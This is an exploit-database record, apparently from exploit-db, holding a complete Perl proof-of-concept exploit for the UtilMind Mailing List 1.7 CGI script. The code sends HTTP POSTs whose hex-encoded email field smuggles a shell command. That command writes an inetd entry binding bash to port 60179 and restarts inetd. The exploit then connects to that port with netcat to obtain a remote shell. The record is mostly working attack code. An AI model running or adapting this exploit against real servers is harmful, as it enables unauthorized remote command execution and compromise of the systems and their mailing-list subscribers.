{
  "id": "188",
  "title": "UtilMind Mail List 1.7 - Users Can Execute Commands",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\n\r\n## Mailing List & News Version 1.7 / PoC Exploit.\r\n## UtilMind Solutions / http://www.utilmind.com/\r\n##\r\n## Actually a pretty amusing exploit to write!\r\n##\r\n## The 'open(MAIL, \"|$mailprog $address\")' ...\r\n## code sends e-mail to those who are on the\r\n## mailing list - and the subscribers' e-mail\r\n## addresses are located in a file called:\r\n## maillist.txt. (could be called anything, really)\r\n##\r\n## So we sign on 'hass@ & echo 'fido stream tcp ..'\r\n## and send out a mail to everyone on the list,\r\n## including to our 'evil' address. Sending mail \r\n## to the subscribers is supposed to be limited \r\n## to those who know the password - but it really\r\n## isn't - so we don't have to wait. <grin>\r\n##\r\n## Exploit will attempt to bind a shell at port \r\n## 60179/fido using inetd.\r\n##\r\n## http://teleh0r.cjb.net/ || teleh0r@doglover.com\r\n\r\nuse strict; use Socket;\r\n\r\nif (@ARGV < 1) {\r\n    print(\"Usage: $0 <target>\\n\");\r\n    exit(1);\r\n}\r\n\r\nmy($target,$agent,$cgicodea,$cgicodeb,$code,\r\n   $iaddr,$paddr,$proto);\r\n\r\n$target = $ARGV[0];\r\n$agent = \"Mozilla/4.0 (compatible; MSIE 5.01; Windows 95)\";\r\n\r\nprint(\"\\nRemote host: $target\\n\");\r\nprint(\"CGI-script: /cgi-bin/maillist.cgi\\n\");\r\n\r\n$code =\r\n\"POST /cgi-bin/maillist.cgi HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: $agent\r\nHost: $target\r\nContent-type: application/x-www-form-urlencoded\r\nContent-length: 160\r\n\r\n\";\r\n\r\n$cgicodea =\r\n\r\n# Utilmind Solutions Maillist Portbinding Cgicode \r\n# Yes! it is meant as a joke!\r\n\"\\x65\\x6d\\x61\\x69\\x6c\\x3d\\x68\\x61\\x73\\x73\\x40\\x2b\\x26\".\r\n\"\\x65\\x63\\x68\\x6f\\x2b\\x27\\x66\\x69\\x64\\x6f\\x2b\\x73\\x74\".\r\n\"\\x72\\x65\\x61\\x6d\\x2b\\x74\\x63\\x70\\x2b\\x6e\\x6f\\x77\\x61\".\r\n\"\\x69\\x74\\x2b\\x6e\\x6f\\x62\\x6f\\x64\\x79\\x2b\\x2f\\x62\\x69\".\r\n\"\\x6e\\x2f\\x62\\x61\\x73\\x68\\x2b\\x62\\x61\\x73\\x68\\x2b\\x2d\".\r\n\"\\x69\\x27\\x2b\\x3e\\x2b\\x2f\\x74\\x6d\\x70\\x2f\\x2e\\x68\\x61\".\r\n\"\\x73\\x73\\x3b\\x2f\\x75\\x73\\x72\\x2f\\x73\\x62\\x69\\x6e\\x2f\".\r\n\"\\x69\\x6e\\x65\\x74\\x64\\x2b\\x2f\\x74\\x6d\\x70\\x2f\\x2e\\x68\".\r\n\"\\x61\\x73\\x73\\x26\\x42\\x31\\x3d\\x4f\\x4b\\x26\\x61\\x63\\x74\".\r\n\"\\x69\\x6f\\x6e\\x3d\\x73\\x75\\x62\\x73\\x63\\x72\\x69\\x62\\x65\";\r\n\r\n$cgicodeb =\r\n\"subject=teleh0rz+cgi+warez&message=hass\";\r\n\r\nsend_code();\r\nprint(\"\\nSleeping 5 seconds - waiting for the shell ...\\n\\n\");\r\nsleep(5); system(\"nc -w 10 $target 60179\"); exit(0);\r\n\r\n# The sleep time may have to be longer - considering that the\r\n# maillist.cgi script has a few e-mails to send. ;)\r\n\r\nsub send_code {\r\n    connect_host();\r\n    send(SOCKET,\"$code$cgicodea\\015\\012\", 0)  || die(\"Error: $!\\n\");\r\n    close(SOCKET); connect_host();\r\n    send(SOCKET,\"$code$cgicodeb\\015\\012\", 0)  || die(\"Error: $!\\n\");\r\n    close(SOCKET);\r\n}\r\n\r\nsub connect_host {\r\n    $iaddr = inet_aton($target)                   || die(\"Error: $!\\n\");\r\n    $paddr = sockaddr_in(80, $iaddr)              || die(\"Error: $!\\n\");\r\n    $proto = getprotobyname('tcp')                || die(\"Error: $!\\n\");\r\n    \r\n    socket(SOCKET, PF_INET, SOCK_STREAM, $proto)  || die(\"Error: $!\\n\");\r\n    connect(SOCKET, $paddr)                       || die(\"Error: $!\\n\");\r\n}\r\n\r\n\r\n# milw0rm.com [2000-11-17]",
  "url": "https://www.exploit-db.com/exploits/188"
}